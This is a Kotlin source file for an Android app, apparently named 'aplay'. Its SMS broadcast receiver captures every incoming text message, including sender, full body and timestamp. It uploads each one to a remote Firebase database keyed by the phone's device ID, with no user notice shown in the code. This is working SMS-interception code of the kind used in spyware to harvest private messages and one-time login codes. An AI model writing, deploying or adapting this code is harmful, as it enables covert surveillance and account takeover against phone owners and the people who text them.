package com.example.aplay

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.telephony.SmsMessage
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            val messages = bundle?.get("pdus") as? Array<*>
            val format = bundle?.getString("format")
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val smsRef = FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

            messages?.forEach { pdu ->
                val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    SmsMessage.createFromPdu(pdu as ByteArray, format)
                } else {
                    SmsMessage.createFromPdu(pdu as ByteArray)
                }

                val smsData = mapOf(
                    "address" to (sms.originatingAddress ?: "Unknown"),
                    "body" to (sms.messageBody ?: ""),
                    "timestamp" to sms.timestampMillis.toString()
                )
                smsRef.push().setValue(smsData)
            }
        }
    }
}
